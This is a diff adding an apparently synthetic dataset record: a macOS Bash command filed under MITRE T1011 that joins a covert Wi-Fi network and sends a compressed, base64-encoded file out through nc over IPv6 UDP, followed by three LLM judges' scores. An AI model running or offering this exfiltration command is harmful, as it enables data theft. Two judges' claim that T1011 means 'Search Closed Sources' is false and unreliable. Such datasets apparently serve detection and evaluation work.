@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"plant-165-ap\" \"P1@nt165\" && gzip -c /Users/Shared/exports/notes.txt | base64 | nc -6u fe80::b10c:0ffe:ca7e:f00d%en0 53371 -w 2",
+  "explanation": "Compresses and base64-encodes a text file and exfiltrates it via IPv6 UDP over a covert Wi\u2011Fi SSID on an uncommon port. This ensures use of an alternate wireless medium consistent with T1011.",
+  "rationale_steps": [
+    "Disassociate from any Wi\u2011Fi in use.",
+    "Join a covert AP on a high 5 GHz channel.",
+    "Compress and encode the file to make contents less readable in transit.",
+    "Transmit via IPv6 UDP on a high port bound to the Wi\u2011Fi interface."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-6b999b55",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags for all tools (airport, networksetup, gzip, base64, nc), and correct pipeline construction.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command is technically functional for data exfiltration, it doesn't align with T1011 (Search Closed Sources) which involves acquiring intelligence from non-public sources rather than exfiltrating data over networks.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T12:46:21.759060Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct command separators, valid flags, and balanced quoting across all components.",
+        "semantic_score": 2,
+        "semantic_justification": "The command largely fails to achieve its claimed intent because 'networksetup -setairportnetwork' requires elevated privileges, which are not provided (only 'airport -z' is 'sudo'ed), thus preventing connection to the specified Wi-Fi, and the activity (exfiltration) does not align with MITRE ATT&CK T1011 (Search Closed Sources), which describes acquiring, not transmitting, intelligence.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T12:46:46.124769Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "Well-formed with correct quoting and separators, but nc\u2019s -w option appears after the destination/port which some BSD nc implementations won\u2019t parse as an option.",
+        "semantic_score": 4,
+        "semantic_justification": "It disconnects, joins a specified Wi\u2011Fi SSID, compresses/base64-encodes a file, and sends it via IPv6 UDP to a link-local target (aligning with exfiltration over an alternate network path), though sudo conflicts with the stated no-privilege context and the nc -w placement may affect reliability.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T12:47:03.568595Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.667,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
